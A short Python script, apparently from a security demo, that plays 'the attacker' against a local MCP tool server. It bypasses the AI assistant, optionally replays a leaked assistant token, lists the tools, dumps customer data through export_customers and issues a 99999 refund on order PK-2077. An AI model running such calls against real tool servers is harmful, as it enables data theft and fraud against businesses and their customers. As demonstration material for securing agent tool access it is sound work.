"""The attacker's side: talk to the MCP server directly, skipping the assistant.
usage: python attack.py [token]     (token: try the assistant's token too, as if it leaked)"""
import json, sys, urllib.error, urllib.request

URL = "http://localhost:5000/mcp"
TOKEN = sys.argv[1] if len(sys.argv) > 1 else None

def rpc(method, params=None):
    body = json.dumps({"jsonrpc": "2.0", "id": 1, "method": method, "params": params or {}}).encode()
    h = {"Content-Type": "application/json", "X-Client": "unknown client"}
    if TOKEN: h["Authorization"] = "Bearer " + TOKEN
    try:
        with urllib.request.urlopen(urllib.request.Request(URL, body, h), timeout=10) as r:
            return r.status, json.load(r)
    except urllib.error.HTTPError as e:
        return e.code, json.load(e)

def show(label, method, params=None):
    code, r = rpc(method, params)
    print(f"$ {label}")
    if "error" in r:
        print(f"  HTTP {code}  {r['error']['message']}")
    elif method == "tools/list":
        print(f"  HTTP {code}  tools: " + ", ".join(t["name"] for t in r["result"]["tools"]))
    else:
        txt = r["result"]["content"][0]["text"]
        print(f"  HTTP {code}  " + (txt if len(txt) < 230 else txt[:227] + "..."))

show("tools/list", "tools/list")
show("tools/call export_customers", "tools/call", {"name": "export_customers", "arguments": {}})
show("tools/call refund_order PK-2077 amount=99999", "tools/call", {"name": "refund_order", "arguments": {"order_id": "PK-2077", "amount": 99999}})
